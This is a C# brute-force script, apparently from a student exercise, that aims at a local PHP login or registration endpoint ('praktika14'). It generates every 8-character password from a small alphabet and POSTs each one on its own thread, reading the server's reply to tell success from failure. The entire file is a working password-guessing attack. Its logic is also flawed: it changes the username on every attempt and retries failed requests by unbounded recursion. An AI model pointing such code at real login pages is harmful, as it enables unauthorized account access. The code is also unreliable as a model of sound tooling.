using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BruteForce
{
    public class Program
    {
        public static string InvalidToken = "4439f14af03c1454a886a3b24101197e";
        public static string Abc = "Asdfg123";
        public delegate void Passwordhandler(string password);
        public static DateTime Start;
        static void Main(string[] args)
        {
            Start = DateTime.Now;
            CreatePassword(8, CheckPassword);
        }

        static int id = 0;
        public static void SignIn(string password) 
        {
            try 
            {
                id++;
                string url = "http://localhost/praktika14/ajax/regin_user.php";

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";

                string postData = $"login=admin{id}&password={password}";
                byte[] data = Encoding.ASCII.GetBytes(postData);
                request.ContentLength = data.Length;

                using (var stream = request.GetRequestStream())
                    stream.Write(data, 0, data.Length);

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                string responseFromServer = new StreamReader(response.GetResponseStream()).ReadToEnd();
                string status = responseFromServer == InvalidToken ? "FALSE" : "TRUE";

                TimeSpan delta = DateTime.Now.Subtract(Start);
                Console.WriteLine(delta.ToString(@"hh\:mm\:ss") + $": {password} - {status}");
            }
            catch (Exception exp) 
            {
                TimeSpan delta = DateTime.Now.Subtract(Start);
                Console.WriteLine(delta.ToString(@"hh\:mm\:ss") + $": {password} - ошибка");
                SignIn(password);
            }
        }

        public static void CheckPassword(string password) 
        {
            Thread thread = new Thread(() => SignIn(password));
            thread.Start();
        }

        public static void CreatePassword(int numberChar, Action<string> processPassword) 
        {
            char[] chars = Abc.ToCharArray();

            int[] indices = new int[numberChar];
            long totalCombinations = (long)Math.Pow(chars.Length, numberChar);

            for (int i = 0; i < totalCombinations; i++) 
            {
                StringBuilder password = new StringBuilder(numberChar);

                for (int j = 0; j < numberChar; j++) 
                {
                    password.Append(chars[indices[j]]);
                }
                processPassword(password.ToString());

                for (int j = numberChar - 1; j >= 0; j--)
                {
                    indices[j]++;
                    if (indices[j] < chars.Length) 
                    {
                        break;
                    }
                    indices[j] = 0;
                }
            }
        }
    }
}